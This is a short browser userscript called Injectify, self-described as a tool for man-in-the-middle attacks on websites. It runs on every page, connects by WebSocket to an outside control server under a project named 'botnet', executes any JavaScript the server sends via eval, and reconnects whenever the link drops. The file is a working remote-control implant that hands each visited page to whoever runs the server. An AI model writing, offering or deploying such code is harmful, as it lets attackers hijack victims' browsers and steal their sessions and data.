// ==UserScript==
// @match        *
// @name         Injectify
// @namespace    https://github.com/samdenty99/injectify
// @version      1.0
// @description  Perform advanced MiTM attacks on websites with ease.
// @author       samdenty99
// @match        *://*/*
// @grant        none
// @icon         https://github.com/samdenty99/injectify/raw/master/assets/injectify.png
// ==/UserScript==

var project = 'botnet';

function u() {
  window.ws = new WebSocket('wss://injectify.samdd.me/i?' + btoa(project))
  ws.onmessage = function(d) {
    try {
      d = JSON.parse(d.data)
      eval(d.d)
    } catch (e) {
      ws.send(JSON.stringify({
        t: 'e',
        d: e.stack,
      }))
    }
  }
  ws.onclose = function() {
    setTimeout(u, 3000)
  }
}
u()